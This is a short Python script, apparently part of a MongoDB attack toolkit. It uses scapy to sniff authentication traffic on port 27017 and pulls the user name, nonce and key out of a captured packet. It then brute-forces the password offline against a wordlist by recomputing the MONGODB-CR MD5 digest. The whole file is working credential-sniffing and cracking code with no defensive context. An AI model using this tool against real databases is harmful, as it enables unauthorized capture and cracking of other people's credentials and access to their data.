#!/usr/bin/python
#coding: utf8

from scapy.all import *
import re
import hashlib
from termcolor import colored

md5 = hashlib.md5
#start=0

def get_packets(port, iface, count):
	packets = sniff(filter="port "+str(port)+"", count=count, iface=str(iface))
	return packets

def parse_packets(port, iface, count):
	packet=""
	user=""
	nonce=""
	key=""
	packets = get_packets(port, iface, count)
	for i in xrange(len(packets)):
		if "key" in re.findall(r'[A-Za-z0-9]{3,}', str(packets[i])):
			packet=packets[i]
			break
	if(len(packet)==0):
		return user,nonce,key,0
	
	else:	
		nonce = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[4]
		user = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[6]
		key = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[8]
	return user, nonce, key,1


def gen_pass(user, nonce, passw):
	return md5(nonce + user + md5(user + ":mongo:" + str(passw)).hexdigest()).hexdigest();


def sniff_mongo():

	print colored("[-] Sniff packages...",'blue')
	print colored("[-] Parse packages...",'yellow')
	user, nonce, key,flag = parse_packets("27017", "lo", 10)
	if(flag==0):
		sniff_mongo()
		#start=start+1
	else:
		print colored("[-] Prepair to brute...",'green')
		file = open('./dictionary/pass.txt')
		file_len = open('./dictionary/pass.txt')
		for i in xrange(len(file_len.readlines())):
			passw = file.readline().split('\n')[0]
			if gen_pass(user, nonce, passw) == key:
				print colored("\n[-]Found - "+user+":"+passw,'green')
				break
